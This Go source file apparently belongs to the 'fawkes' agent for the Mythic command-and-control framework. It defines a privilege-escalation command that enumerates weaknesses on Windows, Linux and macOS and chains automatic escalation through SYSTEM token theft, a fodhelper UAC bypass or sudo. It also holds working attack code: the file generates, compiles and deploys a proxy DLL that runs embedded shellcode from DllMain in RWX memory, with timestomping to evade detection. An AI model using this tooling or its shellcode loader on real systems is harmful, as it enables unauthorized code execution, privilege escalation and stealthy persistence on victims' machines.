package agentfunctions

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "privesc-check",
		Description:         "Privilege escalation enumeration. Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks, ld.so.preload, security modules. macOS: LaunchDaemons, TCC, dylib hijacking, SIP (T1548)",
		HelpString:          "privesc-check -action <all|...> (Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload, dll-exports, hijack-execute, hijack-deploy, service-registry. Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable)",
		Version:             10,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1548", "T1548.001", "T1548.002", "T1574.001", "T1574.002", "T1574.009", "T1574.011", "T1552.001", "T1613", "T1082"},
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "privesc_check_new.js"),
			Author:     "@galoryber",
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"privescEnumDone":     privescEnumDone,
			"privescEscalateDone": privescEscalateDone,
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "auto-escalate", "privileges", "services", "registry", "uac", "unattend", "writable", "dll-hijack", "dll-plant", "dll-sideload", "dll-exports", "hijack-execute", "hijack-deploy", "service-registry", "suid", "sudo", "capabilities", "container", "cron", "nfs", "systemd", "sudo-token", "path-hijack", "docker-group", "group", "polkit", "modprobe", "ld-preload", "security", "launchdaemons", "tcc", "dylib", "sip"},
				Description:      "Check to perform. auto-escalate: automated chain. hijack-execute: read DLL exports for proxy DLL generation — server compiles proxy DLL with shellcode. hijack-deploy: deploy compiled proxy DLL (rename original, place proxy). Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload (T1574.002), dll-exports (PE export table), service-registry (T1574.011). Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "source",
				ModalDisplayName: "Source DLL Path",
				CLIName:          "source",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Path to PE file on target. For dll-plant: DLL to plant. For dll-exports/hijack-execute: DLL to enumerate exports from. For hijack-deploy: compiled proxy DLL path on target.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:                 "shellcode",
				ModalDisplayName:     "Shellcode File",
				CLIName:              "shellcode",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Shellcode to embed in proxy DLL (for hijack-execute). Select a file already in Mythic or build a Fawkes shellcode payload first.",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "target_dir",
				ModalDisplayName: "Target Directory",
				CLIName:          "target_dir",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Writable directory to plant the DLL in (for dll-plant). Use dll-hijack to find writable PATH dirs.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "dll_name",
				ModalDisplayName: "DLL Filename",
				CLIName:          "dll_name",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Name for planted DLL (for dll-plant, e.g. 'fveapi.dll'). Use dll-hijack to find phantom DLL names.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "timestomp",
				ModalDisplayName: "Timestomp",
				CLIName:          "timestomp",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Match planted DLL timestamps to kernel32.dll for stealth (for dll-plant, default: true)",
				DefaultValue:     true,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			switch action {
			case "auto-escalate":
				msg = "OPSEC WARNING: Auto-Escalate Chain will (1) enumerate all privilege escalation vectors, then (2) automatically attempt the best available escalation method. This generates a visible cascade of subtasks. "
				switch taskData.Payload.OS {
				case "Windows":
					msg += "May attempt UAC bypass (registry hijack + process creation) or SYSTEM token steal (OpenProcessToken). Both are high-fidelity EDR detections."
				case "Linux":
					msg += "May attempt sudo escalation. Failed sudo attempts are logged in auth.log."
				case "macOS":
					msg += "May attempt sudo escalation or AppleScript elevation prompt (visible to user)."
				}
			case "hijack-execute":
				msg = "OPSEC WARNING: DLL hijack proxy generation. Agent reads target DLL export table (file I/O). Server compiles proxy DLL with embedded shellcode. Planting the proxy creates new files on disk — high-fidelity EDR detection."
			case "hijack-deploy":
				msg = "OPSEC WARNING: DLL hijack deployment. Renames original DLL and places proxy. File rename + creation in sensitive directories triggers EDR behavioral detections."
			default:
				msg = "OPSEC WARNING: Privilege escalation enumeration accesses system configuration (services, registry, SUID binaries, sudo, cron, systemd). "
				switch taskData.Payload.OS {
				case "Windows":
					msg += "Queries service configs, registry (AlwaysInstallElevated, auto-logon), UAC status, and token privileges. May trigger alerts for bulk service/registry enumeration."
				case "Linux":
					msg += "Scans SUID/SGID binaries, capabilities, sudoers, cron, NFS, systemd units, docker group, ld.so.preload. File system enumeration may be audited."
				case "macOS":
					msg += "Checks LaunchDaemons, TCC database, dylib hijacking, SIP status. TCC database access may require Full Disk Access."
				}
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Privilege escalation check completed. Scanning for SUID, writable services, and misconfigs generates extensive file I/O. Results reveal all local escalation paths.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")

			if action == "auto-escalate" {
				display := "Auto-Escalate Chain: enumerate → escalate"
				response.DisplayParams = &display

				chainCtx, _ := json.Marshal(map[string]string{
					"os":        taskData.Payload.OS,
					"integrity": fmt.Sprintf("%d", taskData.Callback.IntegrityLevel),
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				callbackFunc := "privescEnumDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "privesc-check",
						Params:                  `{"action":"all"}`,
					},
				)
				if err != nil {
					response.Success = false
					response.Error = fmt.Sprintf("Failed to create privesc-check subtask: %s", err.Error())
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					"Auto-Escalate Chain started: privesc-check → conditional escalation")
				return response
			}

			if action == "hijack-execute" {
				source, _ := taskData.Args.GetStringArg("source")
				shellcodeFile, _ := taskData.Args.GetStringArg("shellcode")
				if source == "" {
					response.Success = false
					response.Error = "source is required — path to target DLL on the remote host"
					return response
				}
				if shellcodeFile == "" {
					response.Success = false
					response.Error = "shellcode is required — select a shellcode file from Mythic (build one first with output format = shellcode)"
					return response
				}

				// Resolve shellcode file and store file_id for ProcessResponse
				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
					CallbackID:      taskData.Callback.ID,
					Filename:        shellcodeFile,
					LimitByCallback: false,
					MaxResults:      -1,
				})
				if err != nil || !search.Success || len(search.Files) == 0 {
					response.Success = false
					response.Error = fmt.Sprintf("Shellcode file not found: %s", shellcodeFile)
					return response
				}
				shellcodeFileID := search.Files[0].AgentFileID

				ctx, _ := json.Marshal(map[string]string{
					"shellcode_file_id": shellcodeFileID,
					"shellcode_name":    shellcodeFile,
				})
				ctxStr := string(ctx)
				response.Stdout = &ctxStr

				display := fmt.Sprintf("hijack-execute %s (shellcode: %s)", source, shellcodeFile)
				response.DisplayParams = &display
				return response
			}

			if action != "" && action != "all" {
				response.DisplayParams = &action
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			// Check for hijack-execute export JSON response
			if strings.Contains(responseText, `"action":"hijack-execute"`) {
				processHijackExecuteResponse(processResponse.TaskData, responseText)
				return response
			}

			host := processResponse.TaskData.Callback.Host

			hasVector := strings.Contains(responseText, "VULNERABLE") ||
				strings.Contains(responseText, "AlwaysInstallElevated") ||
				strings.Contains(responseText, "Unquoted Service Path") ||
				strings.Contains(responseText, "NOPASSWD") ||
				strings.Contains(responseText, "SUID") ||
				strings.Contains(responseText, "writable")

			if hasVector {
				tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
					fmt.Sprintf("Privilege escalation vectors found on %s", host))
			}

			logOperationEvent(processResponse.TaskData.Task.ID,
				fmt.Sprintf("[DISCOVERY] Privilege escalation check on %s", host), false)
			return response
		},
	})
}

// privescEnumDone handles privesc-check enumeration completion. Analyzes results
// and creates an appropriate escalation subtask based on OS and findings.
func privescEnumDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Get enumeration results
	responseText := getSubtaskResponses(subtaskData.Task.ID)

	// Get chain context (OS, integrity level)
	chainCtx := extractChainContext(taskData.Task.Stdout)
	osType := chainCtx["os"]
	integrity := chainCtx["integrity"]

	// Analyze results and determine escalation strategy
	var escalationCmd string
	var escalationParams string
	var reason string

	switch osType {
	case "Windows":
		escalationCmd, escalationParams, reason = analyzeWindowsPrivesc(responseText, integrity)
	case "Linux":
		escalationCmd, escalationParams, reason = analyzeLinuxPrivesc(responseText)
	case "macOS":
		escalationCmd, escalationParams, reason = analyzeMacOSPrivesc(responseText)
	default:
		escalationCmd = ""
		reason = "Unknown OS: " + osType
	}

	// Report enumeration summary
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/2] Enumeration complete (%s, integrity=%s).\nAnalysis: %s", osType, integrity, reason)),
	})

	if escalationCmd == "" {
		// No viable escalation path found
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-Escalate: No automatic escalation path found. %s\nReview the privesc-check output for manual exploitation opportunities.", reason)
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskData.Task.ID,
			Response: []byte(msg),
		})
		return response
	}

	// Step 2: Create escalation subtask
	callbackFunc := "privescEscalateDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             escalationCmd,
			Params:                  escalationParams,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-Escalate: Failed to create %s subtask: %s", escalationCmd, err.Error())
		response.Stderr = &msg
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/2] Attempting escalation: %s %s", escalationCmd, escalationParams)),
	})

	return response
}

// privescEscalateDone handles escalation subtask completion. Reports final result.
func privescEscalateDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	completed := true
	response.Completed = &completed

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	status := subtaskData.Task.Status

	var summary string
	if status == "error" {
		summary = fmt.Sprintf("=== Auto-Escalate Chain Complete ===\nEscalation attempt: FAILED\nCommand: %s\nError: %s",
			subtaskData.Task.CommandName, responseText)
	} else {
		summary = fmt.Sprintf("=== Auto-Escalate Chain Complete ===\nEscalation attempt: %s\nCommand: %s\nResult: %s",
			strings.ToUpper(status), subtaskData.Task.CommandName, responseText)
	}

	response.Stdout = &summary
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(summary),
	})

	logOperationEvent(taskData.Task.ID,
		fmt.Sprintf("[PRIVESC] Auto-escalate chain completed (status: %s, method: %s)", status, subtaskData.Task.CommandName), true)

	return response
}

// analyzeWindowsPrivesc determines the best escalation for Windows based on enum results.
func analyzeWindowsPrivesc(enumOutput string, integrity string) (cmd string, params string, reason string) {
	// Integrity levels: 2=medium, 3=high, 4=system
	switch integrity {
	case "4":
		return "", "", "Already running as SYSTEM (integrity=4). No escalation needed."
	case "3":
		// High integrity (admin) — try to get SYSTEM
		if strings.Contains(enumOutput, "SeDebugPrivilege") && strings.Contains(enumOutput, "Enabled") {
			return "getsystem", `{"technique":"steal"}`, "High integrity with SeDebugPrivilege — attempting SYSTEM token steal."
		}
		return "getsystem", `{"technique":"steal"}`, "High integrity (admin) — attempting SYSTEM token steal."
	case "2":
		// Medium integrity — try UAC bypass first
		// Check if UAC is enabled
		if strings.Contains(enumOutput, "EnableLUA") && strings.Contains(enumOutput, "= 0") {
			return "getsystem", `{"technique":"steal"}`, "UAC disabled (EnableLUA=0) — attempting direct SYSTEM token steal."
		}
		return "uac-bypass", `{"technique":"fodhelper"}`, "Medium integrity — attempting UAC bypass via fodhelper."
	default:
		// Low integrity or unknown
		return "", "", fmt.Sprintf("Low/unknown integrity level (%s). No automatic escalation path.", integrity)
	}
}

// analyzeLinuxPrivesc determines the best escalation for Linux based on enum results.
func analyzeLinuxPrivesc(enumOutput string) (cmd string, params string, reason string) {
	// Check if already root
	if strings.Contains(enumOutput, "uid=0") {
		return "", "", "Already running as root. No escalation needed."
	}

	// Check for NOPASSWD sudo rules
	if strings.Contains(strings.ToUpper(enumOutput), "NOPASSWD") {
		// Look for specific NOPASSWD entries
		if strings.Contains(enumOutput, "NOPASSWD: ALL") || strings.Contains(enumOutput, "NOPASSWD:ALL") {
			return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD ALL — attempting sudo escalation."
		}
		return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD rules — attempting sudo escalation."
	}

	// Check for sudo token reuse opportunity
	if strings.Contains(enumOutput, "sudo token reuse") && strings.Contains(enumOutput, "POSSIBLE") {
		return "getsystem", `{"technique":"sudo"}`, "Sudo token reuse possible — attempting sudo escalation."
	}

	// Check for docker group membership
	if strings.Contains(enumOutput, "docker") && strings.Contains(enumOutput, "MEMBER") {
		return "", "", "Docker group membership found — manual docker escape available but not automated."
	}

	return "", "", "No automatic escalation path found (no NOPASSWD sudo, no sudo token reuse). Review enum output for manual vectors."
}

// analyzeMacOSPrivesc determines the best escalation for macOS based on enum results.
func analyzeMacOSPrivesc(enumOutput string) (cmd string, params string, reason string) {
	// Check if already root
	if strings.Contains(enumOutput, "uid=0") {
		return "", "", "Already running as root. No escalation needed."
	}

	// Check for NOPASSWD sudo
	if strings.Contains(strings.ToUpper(enumOutput), "NOPASSWD") {
		return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD rules — attempting sudo escalation."
	}

	// macOS can try osascript prompt (interactive, requires user at desktop)
	return "getsystem", `{"technique":"check"}`, "No passwordless escalation available — running getsystem check to enumerate vectors."
}

type hijackExportEntry struct {
	Ordinal   uint32 `json:"ordinal"`
	Name      string `json:"name"`
	Forwarder string `json:"forwarder"`
}

type hijackExportResponse struct {
	Action      string               `json:"action"`
	OrigPath    string               `json:"orig_path"`
	OrigName    string               `json:"orig_name"`
	RenamedName string               `json:"renamed_name"`
	Arch        string               `json:"arch"`
	Exports     []hijackExportEntry  `json:"exports"`
	TargetDir   string               `json:"target_dir,omitempty"`
}

func processHijackExecuteResponse(taskData *agentstructs.PTTaskMessageAllData, responseText string) {
	taskID := taskData.Task.ID

	var exportData hijackExportResponse
	if err := json.Unmarshal([]byte(responseText), &exportData); err != nil {
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskID,
			Response: []byte(fmt.Sprintf("[ERROR] Failed to parse export data: %v", err)),
		})
		return
	}

	ctx := extractChainContext(taskData.Task.Stdout)
	shellcodeFileID := ctx["shellcode_file_id"]
	shellcodeName := ctx["shellcode_name"]

	if shellcodeFileID == "" {
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskID,
			Response: []byte("[ERROR] No shellcode file_id found in task context. Provide shellcode parameter when using hijack-execute."),
		})
		return
	}

	getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
		AgentFileID: shellcodeFileID,
	})
	if err != nil || !getResp.Success {
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskID,
			Response: []byte(fmt.Sprintf("[ERROR] Failed to read shellcode file %s: %v", shellcodeName, err)),
		})
		return
	}
	shellcodeBytes := getResp.Content

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID: taskID,
		Response: []byte(fmt.Sprintf("[*] Read %d exports from %s (%s)\n[*] Shellcode: %s (%d bytes)\n[*] Generating proxy DLL source...",
			len(exportData.Exports), exportData.OrigName, exportData.Arch, shellcodeName, len(shellcodeBytes))),
	})

	cSource := generateProxyCSource(exportData.Exports, exportData.RenamedName, shellcodeBytes)
	defFile := generateProxyDEFFile(exportData.Exports, exportData.RenamedName)

	compiledDLL, compileErr := compileProxyDLL(cSource, defFile, exportData.Arch)
	if compileErr != "" {
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskID,
			Response: []byte(fmt.Sprintf("[ERROR] Proxy DLL compilation failed:\n%s", compileErr)),
		})
		return
	}

	proxyFilename := fmt.Sprintf("proxy_%s", exportData.OrigName)
	createResp, err := mythicrpc.SendMythicRPCFileCreate(mythicrpc.MythicRPCFileCreateMessage{
		TaskID:       taskID,
		FileContents: compiledDLL,
		Filename:     proxyFilename,
		Comment:      fmt.Sprintf("Proxy DLL for %s (%d exports forwarded to %s, %d bytes shellcode)", exportData.OrigName, len(exportData.Exports), exportData.RenamedName, len(shellcodeBytes)),
	})
	if err != nil {
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskID,
			Response: []byte(fmt.Sprintf("[ERROR] Failed to upload compiled proxy DLL: %v", err)),
		})
		return
	}

	var deployInstructions strings.Builder
	deployInstructions.WriteString(fmt.Sprintf("[+] Proxy DLL compiled successfully: %s (%d bytes)\n", proxyFilename, len(compiledDLL)))
	deployInstructions.WriteString(fmt.Sprintf("    Exports: %d forwarded to %s\n", len(exportData.Exports), exportData.RenamedName))
	deployInstructions.WriteString(fmt.Sprintf("    Shellcode: %d bytes embedded in DllMain\n", len(shellcodeBytes)))
	deployInstructions.WriteString(fmt.Sprintf("    File ID: %s\n\n", createResp.AgentFileID))
	deployInstructions.WriteString("--- Deployment Steps ---\n")
	deployInstructions.WriteString("1. Download the proxy DLL to the target:\n")
	deployInstructions.WriteString(fmt.Sprintf("   upload -file_id %s -remote_path C:\\path\\%s\n\n", createResp.AgentFileID, proxyFilename))
	deployInstructions.WriteString("2. Deploy the hijack (rename original, place proxy):\n")
	deployInstructions.WriteString(fmt.Sprintf("   privesc-check -action hijack-deploy -source C:\\path\\%s -target_dir %s -dll_name %s\n\n",
		proxyFilename, filepath.Dir(exportData.OrigPath), exportData.OrigName))
	deployInstructions.WriteString("3. Trigger the hosting process to load the DLL\n")
	deployInstructions.WriteString(fmt.Sprintf("\nCleanup: delete proxy, rename %s back to %s\n",
		exportData.RenamedName, exportData.OrigName))

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskID,
		Response: []byte(deployInstructions.String()),
	})

	createArtifact(taskID, "File Create",
		fmt.Sprintf("Proxy DLL generated: %s (proxying %s, %d exports)", proxyFilename, exportData.OrigName, len(exportData.Exports)))
	logOperationEvent(taskID,
		fmt.Sprintf("[PRIVESC] DLL Hijack proxy generated for %s on %s (%d exports, %d bytes shellcode)",
			exportData.OrigName, taskData.Callback.Host, len(exportData.Exports), len(shellcodeBytes)), true)
}

func generateProxyCSource(_ []hijackExportEntry, _ string, shellcode []byte) string {
	var sb strings.Builder

	sb.WriteString("#include <windows.h>\n\n")
	sb.WriteString("static unsigned char payload[] = {")
	for i, b := range shellcode {
		if i%16 == 0 {
			sb.WriteString("\n    ")
		}
		sb.WriteString(fmt.Sprintf("0x%02X", b))
		if i < len(shellcode)-1 {
			sb.WriteString(", ")
		}
	}
	sb.WriteString("\n};\n\n")

	sb.WriteString(`DWORD WINAPI PayloadThread(LPVOID lpParameter) {
    void (*func)(void) = (void(*)(void))lpParameter;
    func();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        LPVOID mem = VirtualAlloc(NULL, sizeof(payload),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem) {
            CopyMemory(mem, payload, sizeof(payload));
            HANDLE hThread = CreateThread(NULL, 0, PayloadThread, mem, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
    }
    return TRUE;
}
`)

	return sb.String()
}

func generateProxyDEFFile(exports []hijackExportEntry, renamedDLLName string) string {
	var sb strings.Builder

	renamedBase := strings.TrimSuffix(renamedDLLName, ".dll")

	sb.WriteString("EXPORTS\n")
	for _, exp := range exports {
		if exp.Forwarder != "" {
			continue
		}
		if exp.Name != "" {
			sb.WriteString(fmt.Sprintf("    %s=%s.%s @%d\n",
				exp.Name, renamedBase, exp.Name, exp.Ordinal))
		} else {
			sb.WriteString(fmt.Sprintf("    noname_%d=%s.#%d @%d NONAME\n",
				exp.Ordinal, renamedBase, exp.Ordinal, exp.Ordinal))
		}
	}

	return sb.String()
}

func compileProxyDLL(cSource, defFile, arch string) ([]byte, string) {
	tmpDir, err := os.MkdirTemp("", "proxydll-*")
	if err != nil {
		return nil, fmt.Sprintf("Failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	srcPath := filepath.Join(tmpDir, "proxy.c")
	defPath := filepath.Join(tmpDir, "proxy.def")
	outPath := filepath.Join(tmpDir, "proxy.dll")

	if err := os.WriteFile(srcPath, []byte(cSource), 0644); err != nil {
		return nil, fmt.Sprintf("Failed to write C source: %v", err)
	}
	if err := os.WriteFile(defPath, []byte(defFile), 0644); err != nil {
		return nil, fmt.Sprintf("Failed to write DEF file: %v", err)
	}

	compiler := "x86_64-w64-mingw32-gcc"
	if arch == "x86" {
		compiler = "i686-w64-mingw32-gcc"
	}

	cmd := exec.Command(compiler, "-shared", "-o", outPath, srcPath, defPath, "-lkernel32")
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		logging.LogError(err, "Proxy DLL compilation failed")
		return nil, fmt.Sprintf("Compilation failed (%s):\nstdout: %s\nstderr: %s", compiler, stdout.String(), stderr.String())
	}

	dllBytes, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Sprintf("Failed to read compiled DLL: %v", err)
	}

	return dllBytes, ""
}
